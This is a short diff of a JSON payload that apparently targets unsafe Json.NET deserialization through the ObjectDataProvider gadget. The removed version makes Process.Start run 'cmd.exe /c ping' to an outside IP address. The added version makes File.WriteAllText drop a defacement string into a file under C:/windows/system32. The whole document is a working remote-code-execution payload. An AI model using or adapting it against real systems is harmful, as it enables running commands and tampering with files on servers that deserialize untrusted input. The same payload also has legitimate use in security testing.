@@ -1,10 +1,10 @@
 {
     "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
-    "MethodName":"Start",
+    "MethodName":"WriteAllText",
     "MethodParameters":
 	{
         "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
-        "$values":["cmd.exe","/c ping 35.199.165.103"] },
-    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51"}
+        "$values":["pwnasaurus wuz heer","C:/windows/system32/file.txt"] },
+    "ObjectInstance":{"$type":"System.IO.File, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51"}
 	
 }
